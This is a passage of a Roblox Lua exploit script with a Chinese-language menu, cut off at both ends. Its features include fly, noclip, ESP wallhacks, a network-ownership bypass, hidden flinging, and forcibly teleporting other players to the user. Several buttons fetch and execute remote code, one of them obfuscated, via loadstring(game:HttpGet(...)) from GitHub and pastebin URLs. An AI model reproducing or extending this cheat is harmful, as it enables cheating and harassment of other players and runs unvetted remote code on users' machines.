addpositionbutton.TextColor3 = Color3.fromRGB(206, 206, 206)
addpositionbutton.TextSize = 14.000
addpositionbutton.MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local hrp = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
		if hrp then
			local cfr = hrp.CFrame
			local positionframe = Instance.new("Frame")
			local loadposbutton = Instance.new("TextButton")
			local removeposbutton = Instance.new("TextButton")
			local positionName = Instance.new("TextBox")
			positionframe.Name = "positionframe"
			positionframe.Parent = positionsframe.ScrollingFrame
			positionframe.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
			positionframe.BorderSizePixel = 0
			positionframe.Size = UDim2.new(1, -10, 0, 30)
			loadposbutton.Name = "loadposbutton"
			loadposbutton.Parent = positionframe
			loadposbutton.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
			loadposbutton.BorderSizePixel = 0
			loadposbutton.Position = UDim2.new(1, -70, 0, 5)
			loadposbutton.Size = UDim2.new(0, 40, 1, -10)
			loadposbutton.Font = Enum.Font.SourceSans
			loadposbutton.Text = "load"
			loadposbutton.TextColor3 = Color3.fromRGB(223, 223, 223)
			loadposbutton.TextSize = 16.000
			removeposbutton.Name = "removeposbutton"
			removeposbutton.Parent = positionframe
			removeposbutton.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
			removeposbutton.BorderSizePixel = 0
			removeposbutton.Position = UDim2.new(1, -25, 0, 5)
			removeposbutton.Size = UDim2.new(0, 20, 1, -10)
			removeposbutton.Font = Enum.Font.SourceSans
			removeposbutton.Text = "X"
			removeposbutton.TextColor3 = Color3.fromRGB(223, 223, 223)
			removeposbutton.TextSize = 16.000
			positionName.Name = "positionName"
			positionName.Parent = positionframe
			positionName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			positionName.BackgroundTransparency = 1.000
			positionName.BorderSizePixel = 0
			positionName.Position = UDim2.new(0, 5, 0, 5)
			positionName.Size = UDim2.new(1, -80, 1, -10)
			positionName.Font = Enum.Font.SourceSans
			positionName.Text = "Position1"
			positionName.ClearTextOnFocus = false
			positionName.TextColor3 = Color3.fromRGB(0, 0, 0)
			positionName.TextSize = 25.000
			positionName.TextXAlignment = Enum.TextXAlignment.Left
			loadposbutton.MouseButton1Click:Connect(function()
				c = lp.Character
				if c and c.Parent then
					hrp = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
					if hrp then
						if flycf then
							flycf = cfr
						else
							weldtp(hrp, cfr)
						end
					else
						notify("part not found")
					end
				else
					notify("character not found")
				end
			end)
			removeposbutton.MouseButton1Click:Connect(function()
				positionframe:Destroy()
			end)
		end
	end
end)

local charframe = makeFrame(scrollingFrame, "修改数据 小心使用!!!!!", Color3.fromRGB(99, 15, 15))
local function makecharbutton(buttontext)
	local button = Instance.new("TextButton")
	button.Name = "charButton"
	button.Parent = charframe.ScrollingFrame
	button.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(1, -10, 0, 20)
	button.Font = Enum.Font.SourceSans
	button.Text = buttontext
	button.TextColor3 = Color3.fromRGB(226, 226, 226)
	button.TextSize = 15.000
	return button
end
local function respawnRequest()
	local ccfr = ws.CurrentCamera.CFrame
	local c = lp.Character
	lp.Character = nil
	lp.Character = c
	ws.CurrentCamera:GetPropertyChangedSignal("CFrame"):Wait()
	ws.CurrentCamera.CFrame = ccfr
end
local loopr = false
local fakevoidp = nil
reset = function(respawn)
    if fakevoidp then
        fakevoidp = nil
        wait(0.3)
    end
	local c = lp.Character
	local partName, cfr, ccfr = nil, nil, nil
	if not (c and c.Parent) then
		respawnRequest()
		if not loopr then
			notify("character not found, trying to respawn")
		end
		return
	end
	local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
	if not part then
	    respawnRequest()
		if not loopr then
			notify("no part found in the character, trying to respawn")
		end
		return
	end
	partName, cfr, ccfr = part.Name, part.CFrame, ws.CurrentCamera.CFrame
	spawn(function()
		local c, part = c, nil
		while c and c.Parent do
			stepped:Wait()
		end
		while not (c and c.Parent) do
			stepped:Wait()
			c = lp.Character
		end
		while stepped:Wait() and c and c.Parent and (not part) do
			part = gp(c, partName, "BasePart")
		end
		if not part then
			if not loopr then
				notify("failed to tp back")
			end
			return
		end
		weldtp(part, cfr)
		ws.CurrentCamera.CFrame = ccfr
		cfr = false
		if not loopr then
			notify("respawned")
		end
	end)
	if respawn and (not loopr) then
		notify("respawning...")
	end
	if respawn and (plrs.RespawnTime > 0.5) then
		spawn(function()
			while c and c.Parent do
				if part and part.Parent then
					cfr = part.CFrame
				end
				ccfr = ws.CurrentCamera.CFrame
				stepped:Wait()
			end
		end)
		local spamrequest = true
		spawn(function()
			while wait() and spamrequest and c and c.Parent do
				respawnRequest()
			end
		end)
		wait(0.5)
		spamrequest = false
		wait(plrs.RespawnTime - 0.5)
		part = nil
	end
	if c and c.Parent then
		if respawn then
			local hum = c:FindFirstChildOfClass("Humanoid")
			if hum then
				hum:Destroy()
			end
		end
		c:BreakJoints()
		while respawn and gui and cfr do
	        stepped:Wait()
	    end
	end
end
makecharbutton("重生").MouseButton1Click:Connect(function()
	if not loopr then
		reset(true)
	end
end)
makecharbutton("重置").MouseButton1Click:Connect(function()
	reset(false)
end)
local looprb = makecharbutton("循环重生")
spawn(function()
	while wait() and gui do
		if loopr then
			reset(true)
		end
	end
end)
looprb.MouseButton1Click:Connect(function()
	loopr = not loopr
	looprb.Text = "循环重生" .. ((loopr and " (开)") or "")
end)
makecharbutton("删除网格").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		for i, v in pairs(c:GetDescendants()) do
			if v and v.Parent and (v:IsA("Mesh") or v:IsA("SpecialMesh") or v:IsA("CharacterMesh")) then
				v:Destroy()
			end
		end
		notify("removed meshes")
	else
		notify("no character")
	end
end)
makecharbutton("断开连接").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		c:BreakJoints()
		notify("broken joints")
	else
		notify("no character")
	end
end)
local noclipb = makecharbutton("穿墙")
local antiflingb = makecharbutton("防窜掷")
local noclip = false
local antifling = false
noclipb.MouseButton1Click:Connect(function()
	noclip = not noclip
	noclipb.Text = "穿墙" .. ((noclip and " (开)") or "")
end)
antiflingb.MouseButton1Click:Connect(function()
	antifling = not antifling
	antiflingb.Text = "假空" .. ((antifling and " (开)") or "")
end)
local fakevoidb = makecharbutton("隐身")
fakevoidb.MouseButton1Click:Connect(function()
    if fakevoidp then
        fakevoidp = nil
        fakevoidb.Text = "隐身"
    else
        local c = lp.Character
        if not (c and c.Parent) then
            notify("character not found")
            return
        end
        local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
        if not part then
            notify("no part found")
            return
        end
        fakevoidp = part
        fakevoidb.Text = "隐身(开)"
        notify("character teleported under FallenPartsDestroyHeight")
        
        local dh = ws.FallenPartsDestroyHeight
        local cfr = fakevoidp.CFrame
        local newcf = cf(0, dh - 100, 0)
        local camcf = ws.CurrentCamera.CFrame
        ws.CurrentCamera.CameraType = Enum.CameraType.Scriptable
        ws.FallenPartsDestroyHeight = dh - 200
        while stepped:Wait() and gui and c and c.Parent and fakevoidp and fakevoidp.Parent do
            weldtp(fakevoidp, newcf)
        end
        ws.FallenPartsDestroyHeight = dh
        fakevoidb.Text = "隐身"
        if c and c.Parent then
            unview()
            ws.CurrentCamera.CFrame = camcf
            if part and part.Parent then
                weldtp(part, cfr)
                notify("teleported back")
            else
                notify("part removed")
            end
        else
            notify("character removed")
        end
    end
end)
makecharbutton("方块工具").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local tool = c:FindFirstChildOfClass("Tool")
		if tool then
			local found = false
			for i, v in pairs(tool:GetDescendants()) do
				if v and v.Parent and v:IsA("Mesh") or v:IsA("SpecialMesh") then
					v:Destroy()
				end
			end
			if found then
				notify("removed tool meshes")
			else
				notify("no meshes found")
			end
		else
			notify("tool not found")
		end
	else
		notify("no character")
	end
end)
local infjumpb = makecharbutton("连跳")
local infjump = false
local con = nil
con = game:GetService("UserInputService").JumpRequest:Connect(function()
	if not gui then
	    con:Disconnect()
	    return
	end
	if infjump then
		local c = lp.Character
		if c and c.Parent then
			local hum = c:FindFirstChildOfClass("Humanoid")
			if hum then
				hum:ChangeState("Jumping")
			end
		end
	end
end)
infjumpb.MouseButton1Click:Connect(function()
	infjump = not infjump
	infjumpb.Text = "连跳" .. ((infjump and "(开)") or "")
end)
makecharbutton("秒重生").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local hum = c:FindFirstChildOfClass("Humanoid")
		if hum then
			hum.Archivable = true
			local hum1 = hum:Clone()
			hum:Destroy()
			hum1.Parent = c
			notify("humanoid client sided")
		else
			notify("humanoid not found")
		end
	else
		notify("character not found")
	end
end)
local loopgb = makecharbutton("连续秒重生")
local loopg = false
spawn(function()
	while wait() and gui do
		if loopg then
			local c = lp.Character
			if c and c.Parent then
				local part = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
				if part then
					local hum = c:FindFirstChildOfClass("Humanoid")
					if hum then
					    local partName = part.Name
						local new = hum:Clone()
						hum:Destroy()
						new.Parent = c
						ws.CurrentCamera.CameraSubject = c
    					local currentcfr = part.CFrame
    					local camcfr = ws.CurrentCamera.CFrame
    					while wait() and c and c.Parent and part and part.Parent do
    						currentcfr = part.CFrame
    						camcfr = ws.CurrentCamera.CFrame
    						local ff = c:FindFirstChildOfClass("ForceField")
    						if ff then
    							ff:Destroy()
    						end
    					end
    					part = nil
    					while not (part and part.Parent) do
    						wait()
    						c = lp.Character
    						part = gp(c, partName, "BasePart")
    					end
						weldtp(part, currentcfr)
						ws.CurrentCamera.CFrame = camcfr
    				end
				end
			end
		end
	end
end)
loopgb.MouseButton1Click:Connect(function()
	loopg = not loopg
	loopgb.Text = "连续秒重生" .. ((loopg and " (开)") or "")
end)
local flyb = makecharbutton("飞行")
flyb.MouseButton1Click:Connect(function()
	if cfly and cfly.Parent then
		cfly = nil
	else
		cfly = lp.Character
		flyb.Text = "飞行(开)"
	end
end)

local ctrlf = {
	["w"] = false,
	["a"] = false,
	["s"] = false,
	["d"] = false
}
local con = nil
con = mouse.KeyDown:Connect(function(key)
    if not gui then
        con:Disconnect()
        return
    end
	key = key:lower()
	if ctrlf[key] ~= nil then
		ctrlf[key] = true
	end
end)
local con = nil
con = mouse.KeyUp:Connect(function(key)
    if not gui then
        con:Disconnect()
        return
    end
	key = key:lower()
	if ctrlf[key] ~= nil then
		ctrlf[key] = false
	end
end)
local con = nil
con = event:Connect(function()
    if not gui then
        con:Disconnect()
        return
    end
    if not flycf then
        return
    end
    local fb = ((ctrlf["w"] and flyspeed) or 0) + ((ctrlf["s"] and -flyspeed) or 0)
	local lr = ((ctrlf["a"] and -flyspeed) or 0) + ((ctrlf["d"] and flyspeed) or 0)
	local camcf = ws.CurrentCamera.CFrame
	local caX, caY, caZ, ca1, ca2, ca3, ca4, ca5, ca6, ca7, ca8, ca9 = camcf:GetComponents()
	flycf = cf(flycf.X, flycf.Y, flycf.Z, ca1, ca2, ca3, ca4, ca5, ca6, ca7, ca8, ca9)
	flycf += camcf.lookVector * fb
	flycf += camcf.rightVector * lr
end)
spawn(function()
    while stepped:Wait() and gui do
    	if cfly and cfly.Parent then
    		fhrp = (fhrp and (fhrp.Parent == cfly) and fhrp) or gp(cfly, "HumanoidRootPart", "BasePart") or gp(cfly, "Head", "BasePart") or cfly:FindFirstChildWhichIsA("BasePart")
    		if fhrp then
    		    flycf = flycf or fhrp.CFrame
    			weldtp(fhrp, flycf)
    		end
    	else
    		flycf = false
    		fhrp = nil
    		flyb.Text = "飞行"
    	end
	end
end)

local hiddenfling = false
spawn(function()
    local hrp, c, vel = nil, nil, nil
    while gui do
        heartbeat:Wait()
        if hiddenfling then
            while gui and hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
                heartbeat:Wait()
                c = lp.Character
                hrp = gp(c, "HumanoidRootPart", "BasePart")
            end
            if gui and hiddenfling then 
                vel = hrp.Velocity
                hrp.Velocity = hrp.Velocity.Unit * v3(20000, 0, 20000) + v3(0, 5000, 0)
                renderstepped:Wait()
                if c and c.Parent and hrp and hrp.Parent then
                    hrp.Velocity = vel
                end
            end
        end
    end
end)
local hiddenflingB = makecharbutton("隐秘的投掷")
hiddenflingB.MouseButton1Click:Connect(function()
    hiddenfling = not hiddenfling
    hiddenflingB.Text = "隐秘的投掷" .. ((hiddenfling and "(开)") or "")
end)

makecharbutton("反重生(等待 5 秒)").MouseButton1Click:Connect(respawnRequest)
makecharbutton("无动画").MouseButton1Click:Connect(noanimations)
makecharbutton("坐").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local hum = c:FindFirstChildOfClass("Humanoid")
		if hum then
			hum.Sit = not hum.Sit
		else
			notify("humanoid not found")
		end
	else
		notify("character not found")
	end
end)
makecharbutton("假坐").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local hum = c:FindFirstChildOfClass("Humanoid")
		if hum then
		    hum:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
			hum.Sit = true
			notify("humanoid.Sit set to true")
		else
			notify("humanoid not found")
		end
	else
		notify("character not found")
	end
end)
makecharbutton("移除人形机器人").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c then
		local cpar = c.Parent
		if cpar then
			local hrp = gp(c, "HumanoidRootPart", "BasePart")
			if hrp then
				c.Parent = nil
				hrp:Destroy()
				c.Parent = cpar
				notify("hrp removed")
			else
				notify("hrp not found")
			end
		else
			notify("character not found")
		end
	else
		notify("character not found")
	end
end)
makecharbutton("将可触碰设置为假").MouseButton1Click:Connect(function()
	local c = lp.Character
	if c and c.Parent then
		local tool = c:FindFirstChildOfClass("Tool")
		for i, v in pairs(c:GetDescendants()) do
			if v and v.Parent and v:IsA("BasePart") and ((not tool) or (not v:IsDescendantOf(tool))) then
				v.CanTouch = false
			end
		end
		notify("CanTouch has been set to false")
	else
		notify("character not found")
	end
end)
local ctrltp = false
local clicktpbutton = makecharbutton("按住CRTL时点击传送")
clicktpbutton.MouseButton1Click:Connect(function()
    ctrltp = not ctrltp
    clicktpbutton.Text = "按住CRTL时点击传送" .. ((ctrltp and " (开)") or "")
end)
local con = nil
con = mouse.Button1Down:Connect(function()
    if not gui then
        con:Disconnect()
        return
    end
    if not ctrltp then
        return
    end
    if not (mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl)) then
        return
    end
    local to = mouse.Hit.Position + v3(0, 3, 0)
    to = cf(to, to + v3(-1, 0, -1) * ws.CurrentCamera.CFrame.LookVector)
    if flycf then
        flycf = to
        return
    end
    local c = lp.Character
    if not (c and c.Parent) then
        return
    end
    local hrp = gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Torso", "BasePart") or gp(c, "UpperTorso", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
    if hrp then
        weldtp(hrp, to)
    end
end)
makecharbutton("监视").MouseButton1Click:Connect(unview)

local utilframe = makeFrame(scrollingFrame, "绘制", Color3.fromRGB(0, 150, 150))
local utilscroll = utilframe.ScrollingFrame

local function makeutilbutton(buttontext)
	local button = Instance.new("TextButton")
	button.Name = "utilButton"
	button.Parent = utilscroll
	button.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
	button.BorderSizePixel = 0
	button.Size = UDim2.new(1, -10, 0, 20)
	button.Font = Enum.Font.SourceSans
	button.Text = buttontext
	button.TextColor3 = Color3.fromRGB(226, 226, 226)
	button.TextSize = 15.000
	return button
end

local netb = makeutilbutton("网络旁路")
local net = false
netb.MouseButton1Click:Connect(function()
	if net then
		net = false
	else
		net = shp and function(Radius) 
			shp(lp, "SimulationRadius", Radius) 
		end
		net = net or ssr
		if net then
			pcall(function()
				shp(lp, "MaximumSimulationRadius", 9e9)
			end)
		else
			notify("exploit not supported")
		end
	end
	netb.Text = "网络旁路" .. ((net and "(开)") or "")
end)

local espb = makeutilbutton("显示模型")
local esp = false
espb.MouseButton1Click:Connect(function()
	esp = not esp
	espb.Text = "显示模型" .. ((esp and " (开)") or "")
end)
local teamcheckb = makeutilbutton("ESP 团队检查")
local espTeamCheck = false
teamcheckb.MouseButton1Click:Connect(function()
	espTeamCheck = not espTeamCheck
	teamcheckb.Text = "ESP 团队检查" .. ((espTeamCheck and " (开)") or "")
end)

local espcolor = Color3.fromRGB(255, 0, 0)

local vpf = Instance.new("ViewportFrame", gui)
vpf.BackgroundTransparency = 1
vpf.BorderSizePixel = 0
vpf.ImageTransparency = 0.5
vpf.ImageColor3 = espcolor
vpf.BackgroundColor3 = espcolor
vpf.Size = UDim2.new(1, 0, 1, 0)
vpf.Visible = true
vpf.Name = "esp"

local con = nil
con = renderstepped:Connect(function()
    if not gui then
        con:Disconnect()
        return
    end
	if net then
		net(9e9)
	end
	vpf:ClearAllChildren()
	if esp then
	    vpf.CurrentCamera = ws.CurrentCamera
		for i, plr in pairs(plrs:GetPlayers()) do
			if ( (not espTeamCheck) or (plr.Team ~= lp.Team) ) and (plr ~= lp) then
				local c = plr.Character
				if c and c.Parent then
					for i, part in pairs(c:GetDescendants()) do
						if part:IsA("BasePart") then
							local part1 = Instance.new("Part", vpf)
							part1.Color = espcolor
							part1.Size = part.Size
							part1.CFrame = part.CFrame
						end
					end
				end
			end
		end
	end
	if viewedPlayer then
	    local c = viewedPlayer.Character
	    if c and c.Parent then
    	    local subject = c:FindFirstChildOfClass("Humanoid") or c:FindFirstChildWhichIsA("BasePart")
    	    if subject then
    	        ws.CurrentCamera.CameraType = Enum.CameraType.Custom
    	        ws.CurrentCamera.CameraSubject = subject
    	    end
	    end
	end
end)

makeutilbutton("加入").MouseButton1Click:Connect(function()
	if #plrs:GetPlayers() == 1 then
		lp:Kick()
		wait()
		game:GetService("TeleportService"):Teleport(game.PlaceId, lp)
	else
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)
	end
end)

makeutilbutton("服务器跃点").MouseButton1Click:Connect(function()
	local servers = nil
	pcall(function()
		servers = game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data
	end)
	if type(servers) ~= "table" then
		notify("error getting server list")
		return
	end
	local jobIds = {}
	for i, v in pairs(servers) do
		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
			table.insert(jobIds, v.id)
		end
	end
	if #jobIds > 0 then
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, jobIds[math.random(1, #jobIds)])
	else
		notify("no server found")
	end
end)

makeutilbutton("即时休假").MouseButton1Click:Connect(function()
	lp:Kick()
	wait()
	game:Shutdown()
end)


local cbringframe = makeFrame(scrollingFrame, "把他传送过来", Color3.fromRGB(15, 100, 15))
local cbringscroll = cbringframe.ScrollingFrame

local cbring = {}

local togglecbring = nil

local function makecbringframe(name)
	local plrcbringf = Instance.new("Frame")
	local uncbringbtn = Instance.new("TextButton")
	local cbringplrname = Instance.new("TextBox")
	plrcbringf.Name = name
	plrcbringf.BackgroundColor3 = Color3.fromRGB(106, 106, 106)
	plrcbringf.BorderSizePixel = 0
	plrcbringf.Size = UDim2.new(1, -10, 0, 30)
	plrcbringf.Parent = cbringscroll
	uncbringbtn.Name = "removeposbutton"
	uncbringbtn.Parent = plrcbringf
	uncbringbtn.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
	uncbringbtn.BorderSizePixel = 0
	uncbringbtn.Position = UDim2.new(1, -25, 0, 5)
	uncbringbtn.Size = UDim2.new(0, 20, 1, -10)
	uncbringbtn.Font = Enum.Font.SourceSans
	uncbringbtn.Text = "X"
	uncbringbtn.TextColor3 = Color3.fromRGB(223, 223, 223)
	uncbringbtn.TextSize = 16.000
	cbringplrname.Parent = plrcbringf
	cbringplrname.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	cbringplrname.BackgroundTransparency = 1.000
	cbringplrname.BorderSizePixel = 0
	cbringplrname.Position = UDim2.new(0, 5, 0, 5)
	cbringplrname.Size = UDim2.new(1, -80, 1, -10)
	cbringplrname.Font = Enum.Font.SourceSans
	cbringplrname.Text = name
	cbringplrname.TextColor3 = Color3.fromRGB(0, 0, 0)
	cbringplrname.TextSize = 25.000
	cbringplrname.TextXAlignment = Enum.TextXAlignment.Left
	uncbringbtn.MouseButton1Click:Connect(function()
		togglecbring(name)
	end)
	return plrcbringf
end

togglecbring = function(name)
	local frame = gp(cbringscroll, name, "Frame")
	if frame then
		pcall(function()
			table.remove(cbring, table.find(cbring, name))
		end)
		frame:Destroy()
		notify("removed " .. name .. " from cbring")
	else
		table.insert(cbring, name)
		makecbringframe(name)
		notify("added " .. name .. " to cbring")
	end
end

cbringb.MouseButton1Click:Connect(function()
	togglecbring(currentplayer.Name)
end)

local cbringallbtn = Instance.new("TextButton")
cbringallbtn.Name = "cbringallbtn"
cbringallbtn.Parent = cbringframe.framelabel
cbringallbtn.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
cbringallbtn.BorderSizePixel = 0
cbringallbtn.Position = UDim2.new(1, -57, 0, 2)
cbringallbtn.Size = UDim2.new(0, 55, 1, -4)
cbringallbtn.Font = Enum.Font.SourceSans
cbringallbtn.Text = "+添加全部"
cbringallbtn.TextColor3 = Color3.fromRGB(206, 206, 206)
cbringallbtn.TextSize = 14.000
cbringallbtn.MouseButton1Click:Connect(function()
	for i, v in pairs(plrs:GetPlayers()) do
		if (v ~= lp) and v and v.Parent and (not table.find(cbring, v.Name)) then
			togglecbring(v.Name)
		end
	end
end)

spawn(function()
	while gui do
		local waited = false
		local lpc = lp.Character
		if lpc and lpc.Parent then
			local part0 = gp(lpc, "Torso", "BasePart") or gp(lpc, "HumanoidRootPart", "BasePart") or gp(lpc, "Head", "BasePart") or lpc:FindFirstChildWhichIsA("BasePart")
			if part0 then
				for i, v in pairs(plrs:GetPlayers()) do
					if v ~= lp then
						local c = v.Character
						if c and c.Parent then
							if table.find(cbring, v.Name) then
								local part1 = gp(c, part0.Name, "BasePart") or gp(c, "Torso", "BasePart") or gp(c, "HumanoidRootPart", "BasePart") or gp(c, "Head", "BasePart") or c:FindFirstChildWhichIsA("BasePart")
								if part1 then
									local p1cf = part0.CFrame
									waited = true
									weldtp(part1, p1cf + p1cf.LookVector * 2)
								end
							end
						end
					end
				end
			end
		end
		if not waited then
			stepped:Wait()
		end
	end
end)

local con = nil
con = stepped:Connect(function()
    if not gui then
        con:Disconnect()
        return
    end
	local lpc = lp.Character
	if noclip and lpc and lpc.Parent then
		for i, v in pairs(lpc:GetDescendants()) do
			if v:IsA("BasePart") then
				v.CanCollide = false
			end
		end
	end
end)

local con0, con1 = nil, nil
local function antiflingF()
    if not gui then
        con0:Disconnect()
        con1:Disconnect()
        return
    end
    if antifling then
		for i, v in pairs(plrs:GetPlayers()) do
			if v ~= lp then
				local c = v.Character
				if c and c.Parent then
					for i1, v1 in pairs(c:GetDescendants()) do
						if v1:IsA("BasePart") then
							v1.CanCollide = false
							v1.Velocity = v3_0
							v1.RotVelocity = v3_0
						end
					end
				end
			end
        end
    end
end
con0 = stepped:Connect(antiflingF)
con1 = heartbeat:Connect(antiflingF)

gui.Enabled = true
renderstepped:Wait()
playercframe.Visible = false

  	end    

})

Tab:AddButton({

	Name = "人物踏空",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float'))()

  	end    

})

Tab:AddButton({

	Name = "人物铁拳",

	Callback = function()

     loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt'))()

  	end    

})

Tab:AddButton({

	Name = "直升机旋转",

	Callback = function()

     if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R6 then
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://27432686"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()

local spinSpeed = 40
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)

end)
else
spawn(function()
local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://507776043"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
bruh:Play()
bruh:AdjustSpeed(0)
speaker.Character.Animate.Disabled = true
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=165113352"
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()

local spinSpeed = 40
local Spin = Instance.new("BodyAngularVelocity")
Spin.Name = "Spinning"
Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
Spin.MaxTorque = Vector3.new(0, math.huge, 0)
Spin.AngularVelocity = Vector3.new(0,spinSpeed,0)


end)    
end
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
local u = game.Players.LocalPlayer
local urchar = u.Character

task.spawn(function()


qUp = Mouse.KeyUp:Connect(function(KEY)
if KEY == 'q' then
urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight - 3
end
end)
eUp = Mouse.KeyUp:Connect(function(KEY)
if KEY == 'e' then
urchar.Humanoid.HipHeight = urchar.Humanoid.HipHeight + 3
end
end)


end)

  	end    

})

Tab:AddButton({

	Name = "甩飞敌人",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()

  	end    

})

Tab:AddButton({

	Name = "灵魂出窍",

	Callback = function()

     for i, v in pairs(game.CoreGui:GetChildren()) do
    if v:FindFirstChild("UI") then
        v:Destroy()
    end
end
wait(1)

local UI = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local Toggle = Instance.new("ImageLabel")
local Button = Instance.new("TextButton")
local Circle = Instance.new("ImageLabel")
local InvisText = Instance.new("TextLabel")
local Credits = Instance.new("TextLabel")

--Properties:

UI.Name = "UI"
UI.Parent = game:WaitForChild("CoreGui")

Main.Name = "Main"
Main.Parent = UI
Main.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
Main.BackgroundTransparency = 1.000
Main.Position = UDim2.new(0.5, -75, 0.41232878, -37)
Main.Size = UDim2.new(0, 248, 0, 107)
Main.Image = "rbxassetid://3570695787"
Main.ImageColor3 = Color3.fromRGB(48, 48, 48)
Main.ScaleType = Enum.ScaleType.Slice
Main.SliceCenter = Rect.new(100, 100, 100, 100)
Main.SliceScale = 0.120

Toggle.Name = "Toggle"
Toggle.Parent = Main
Toggle.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
Toggle.BackgroundTransparency = 1.000
Toggle.Position = UDim2.new(0.5, -23, 0.565420568, -11)
Toggle.Size = UDim2.new(0, 46, 0, 22)
Toggle.Image = "rbxassetid://3570695787"
Toggle.ImageColor3 = Color3.fromRGB(200, 200, 200)
Toggle.ScaleType = Enum.ScaleType.Slice
Toggle.SliceCenter = Rect.new(100, 100, 100, 100)
Toggle.SliceScale = 0.120

Button.Name = "Button"
Button.Parent = Toggle
Button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Button.BackgroundTransparency = 1.000
Button.Size = UDim2.new(1, 0, 1, 0)
Button.Font = Enum.Font.SourceSans
Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Button.TextSize = 14.000
Button.TextTransparency = 1.000

local toggled = false
local debounce = false

Button.MouseButton1Click:Connect(
    function()
        if debounce == false then
            if toggled == true then
                debounce = true
                game:GetService("TweenService"):Create(
                    Toggle,
                    TweenInfo.new(0.25),
                    {ImageColor3 = Color3.fromRGB(200, 200, 200)}
                ):Play()
                game:GetService("TweenService"):Create(Circle, TweenInfo.new(0.25), {Position = UDim2.new(0, 2, 0, 2)}):Play(

                )
                wait(0.25)
                debounce = false
                toggled = false

                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            elseif toggled == false then
                debounce = true
                game:GetService("TweenService"):Create(
                    Toggle,
                    TweenInfo.new(0.25),
                    {ImageColor3 = Color3.fromRGB(64, 200, 114)}
                ):Play()
                game:GetService("TweenService"):Create(
                    Circle,
                    TweenInfo.new(0.25),
                    {Position = UDim2.new(1, -20, 0, 2)}
                ):Play()
                wait(0.25)
                debounce = false
                toggled = true
                for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if v.Name == "Root" or v.Name == "RootJoint" then
                        v:Destroy()
                    end
                end
            end
        end
    end
)

Circle.Name = "Circle"
Circle.Parent = Toggle
Circle.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Circle.BackgroundTransparency = 1.000
Circle.Position = UDim2.new(0, 2, 0, 2)
